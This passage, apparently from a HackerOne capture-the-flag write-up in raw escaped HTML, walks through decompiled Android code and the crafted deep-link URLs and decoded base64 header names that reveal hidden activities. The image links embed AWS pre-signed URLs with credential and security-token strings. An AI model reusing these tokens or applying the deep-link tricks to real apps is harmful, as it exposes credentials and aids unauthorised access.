java\"\u003e\u003ccode\u003e\u003cspan class=\"nc\"\u003eEditText\u003c/span\u003e \u003cspan class=\"n\"\u003eeditText\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eEditText\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003efindViewById\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2131230834\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nc\"\u003eButton\u003c/span\u003e \u003cspan class=\"n\"\u003ebutton\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eButton\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003efindViewById\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2131230794\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nc\"\u003eTextView\u003c/span\u003e \u003cspan class=\"n\"\u003etextView\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eTextView\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003efindViewById\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2131231002\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003cspan class=\"n\"\u003eeditText\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003cspan class=\"n\"\u003ebutton\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003cspan class=\"n\"\u003etextView\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand all I had to do in order to make them visible was figuring out the params within the URL: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"nc\"\u003eUri\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetQueryParameter\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;two\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetQueryParameter\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;switch\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr1\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003estr1\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;light\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003estr2\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003estr2\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;on\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeditText\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ebutton\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003etextView\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTherefore, the URL was: \u003ccode\u003etwo://part?two=light\u0026amp;switch=on\u003c/code\u003e. This resulted with a hash, an input field which asked for a header name. \u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"apk-3_.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/euDGE1oMtwGhn9eHRsxwPDko?response-content-disposition=attachment%3B%20filename%3D%22apk-3_.png%22%3B%20filename%2A%3DUTF-8%27%27apk-3_.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=3057706dd064d3a062b27e2007d6766740d557309b499e1f027276a869341158\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/euDGE1oMtwGhn9eHRsxwPDko?response-content-disposition=attachment%3B%20filename%3D%22apk-3_.png%22%3B%20filename%2A%3DUTF-8%27%27apk-3_.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=3057706dd064d3a062b27e2007d6766740d557309b499e1f027276a869341158\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWhile doing some recon, I already saw a suspicious base64 code in the 3rd Activity:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003edecodedDirectory\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eBase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;aG9zdA==\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003edecodedDirectoryTwo\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eBase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;WC1Ub2tlbg==\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003edirectory\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;aG9zdA==\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003edirectoryTwo\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;WC1Ub2tlbg==\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003eheaderDirectory\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;header\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDecoding both resulted with the following strings: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;WC1Ub2tlbg==\u0026quot;\u003c/span\u003e | \u003cspan class=\"nb\"\u003ebase64\u003c/span\u003e \u003cspan class=\"nt\"\u003e-d\u003c/span\u003e\nX-Token: \n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;aG9zdA==\u0026quot;\u003c/span\u003e | \u003cspan class=\"nb\"\u003ebase64\u003c/span\u003e \u003cspan class=\"nt\"\u003e-d\u003c/span\u003e\nhost\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing the \u003ccode\u003eX-Token\u003c/code\u003e header I got to the 3rd Activity, which again had insvisible components: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003eprotected\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonCreate\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eBundle\u003c/span\u003e \u003cspan class=\"n\"\u003eparamBundle\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eEditText\u003c/span\u003e \u003cspan class=\"n\"\u003eeditText\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eEditText\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003efindViewById\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2131230837\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eButton\u003c/span\u003e \u003cspan class=\"n\"\u003ebutton\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eButton\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003efindViewById\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2131230796\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeditText\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ebutton\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooking into the code, I saw that there was an HTTP request that was supposed to be fired once everything had been loaded correctly: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003echildRefThree\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eaddListenerForSingleValueEvent\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eValueEventListener\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonCancelled\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eDatabaseError\u003c/span\u003e \u003cspan class=\"n\"\u003eparam1DatabaseError\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ee\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;TAG\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;onCancelled\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eThrowable\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003eparam1DatabaseError\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoException\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonDataChange\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eDataSnapshot\u003c/span\u003e \u003cspan class=\"n\"\u003eparam1DataSnapshot\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003eparam1DataSnapshot\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetValue\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efirstParam\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003edecodedFirstParam\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;PartThreeActivity\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003esecondParam\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003edecodedSecondParam\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;on\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ethirdParam\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr1\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eStringBuilder\u003c/span\u003e \u003cspan class=\"n\"\u003estringBuilder\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eStringBuilder\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n            \u003cspan class=\"n\"\u003estringBuilder\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eappend\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;X-\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003estringBuilder\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eappend\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr1\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estringBuilder\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoString\u003c/span\u003e\u003cspan class=\"o\"\u003e()))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"n\"\u003eeditText\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ebutton\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003ePartThreeActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ethread\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003estart\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e \n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e \n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e \n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing the following URL: \u003ccode\u003ethree://part?switch=b24%3D\u0026amp;three=UGFydFRocmVlQWN0aXZpdHk%3D\u0026amp;header=X-Token\u003c/code\u003e I was able to execute this code\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"apk-2.png\" 